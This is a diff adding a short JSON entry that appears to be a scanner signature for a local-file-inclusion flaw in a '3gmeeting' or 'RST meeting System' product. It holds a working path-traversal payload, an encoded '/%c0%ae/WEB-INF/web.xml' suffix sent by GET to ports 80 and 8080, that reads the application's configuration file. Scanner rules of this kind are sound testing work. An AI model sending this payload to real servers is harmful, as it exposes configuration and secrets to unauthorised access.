@@ -1,0 +1,12 @@
+{
+    "name": "3gmeeting_LFI",
+    "method": "GET",
+    "port": [
+        80,
+        8080
+    ],
+    "suffix": "/%c0%ae/WEB-INF/web.xml",
+    "hits": [
+        "RST meeting System"
+    ]
+}
